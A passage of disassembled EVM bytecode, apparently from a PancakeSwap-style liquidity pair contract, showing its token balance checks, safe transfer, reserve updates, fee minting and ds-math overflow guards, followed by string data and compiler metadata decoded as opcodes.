SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1946 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x195A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1970 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19C3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x19D7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x19ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1A0C DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A29 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A37 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1A70 JUMPI PUSH2 0x1A5B PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1A6A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1A90 JUMP JUMPDEST PUSH2 0x1A8D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1ACF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25FF PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1AD9 DUP11 DUP11 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1B52 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1C62 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BA3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1BB7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1BCD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C1A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C2E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C44 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xF SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D16 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1CF7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1D78 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D7D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1DAB JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1DAB JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1DA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1DFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A205452414E534645525F4641494C45440000000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO DUP1 PUSH2 0x1E1E JUMPI POP POP DUP1 DUP3 MUL DUP3 DUP3 DUP3 DUP2 PUSH2 0x1E1B JUMPI INVALID JUMPDEST DIV EQ JUMPDEST PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6D756C2D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 GT DUP1 ISZERO SWAP1 PUSH2 0x1ED4 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 GT ISZERO JUMPDEST PUSH2 0x1F19 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x50616E63616B653A204F564552464C4F57 PUSH1 0x78 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0xB SLOAD PUSH4 0xFFFFFFFF TIMESTAMP DUP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV DUP2 AND DUP3 SUB SWAP1 DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1F49 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 AND ISZERO ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x1F5D JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 AND ISZERO ISZERO JUMPDEST ISZERO PUSH2 0x1FCE JUMPI DUP1 PUSH4 0xFFFFFFFF AND PUSH2 0x1F8B DUP6 PUSH2 0x1F76 DUP7 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x2568 AND JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE PUSH4 0xFFFFFFFF DUP2 AND PUSH2 0x1FB6 DUP5 PUSH2 0x1F76 DUP8 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0xD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE JUMPDEST PUSH1 0xB DUP1 SLOAD PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP2 SWAP1 SWAP2 OR PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x70 SHL NOT AND PUSH1 0x1 PUSH1 0x70 SHL DUP9 DUP4 AND DUP2 MUL SWAP2 SWAP1 SWAP2 OR PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH1 0x1 PUSH1 0xE0 SHL PUSH4 0xFFFFFFFF DUP8 AND MUL OR SWAP3 DUP4 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP4 DIV SWAP1 SWAP2 AND PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD PUSH32 0x1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1 SWAP3 SWAP2 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2104 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x2139 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x17E7E58 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x21D4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x21E8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x21FE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xE SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND ISZERO DUP1 ISZERO SWAP5 POP SWAP2 SWAP3 POP SWAP1 PUSH2 0x22E2 JUMPI DUP1 ISZERO PUSH2 0x22DD JUMPI PUSH1 0x0 PUSH2 0x2241 PUSH2 0xFC4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP1 DUP9 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x224E DUP4 PUSH2 0x22F6 JUMP JUMPDEST SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x22DA JUMPI PUSH1 0x0 PUSH2 0x2281 PUSH1 0x8 PUSH2 0xB47 PUSH2 0x2272 DUP7 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x22B6 PUSH2 0x2299 DUP5 PUSH1 0x8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22AA DUP7 PUSH1 0x11 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 DUP4 DUP2 PUSH2 0x22C3 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 ISZERO PUSH2 0x22D6 JUMPI PUSH2 0x22D6 DUP8 DUP3 PUSH2 0x2348 JUMP JUMPDEST POP POP POP JUMPDEST POP POP JUMPDEST PUSH2 0x22EE JUMP JUMPDEST DUP1 ISZERO PUSH2 0x22EE JUMPI PUSH1 0x0 PUSH1 0xE SSTORE JUMPDEST POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 DUP3 GT ISZERO PUSH2 0x2339 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x2 DUP3 DIV ADD JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x2333 JUMPI DUP1 SWAP2 POP PUSH1 0x2 DUP2 DUP3 DUP6 DUP2 PUSH2 0x2322 JUMPI INVALID JUMPDEST DIV ADD DUP2 PUSH2 0x232B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x230B JUMP JUMPDEST POP PUSH2 0x2343 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x2343 JUMPI POP PUSH1 0x1 JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x235B SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2386 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x23DB JUMPI DUP2 PUSH2 0x23DD JUMP JUMPDEST DUP3 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x240D SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP2 SWAP1 SWAP2 SSTORE SLOAD PUSH2 0x243A SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x24CD JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x42455032303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x24E0 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x250B SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP7 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND PUSH1 0x1 PUSH1 0x70 SHL MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB DUP5 AND DUP2 PUSH2 0x2585 JUMPI INVALID JUMPDEST DIV SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x49 0x4E POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD SSTORE PUSH15 0x697377617056323A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F TIMESTAMP SSTORE MSTORE 0x4E GASLIMIT DIFFICULTY 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4F SSTORE SLOAD POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY LOG2 PUSH6 0x627A7A723158 KECCAK256 STATICCALL 0x4B CALLDATASIZE SHR 0xDD PUSH14 0xAA0DA2A7850E0455536877912409 SDIV 0xA8 EXTCODECOPY CODECOPY 0xDD SSTORE PUSH2 0x6799 DUP15 PUSH23 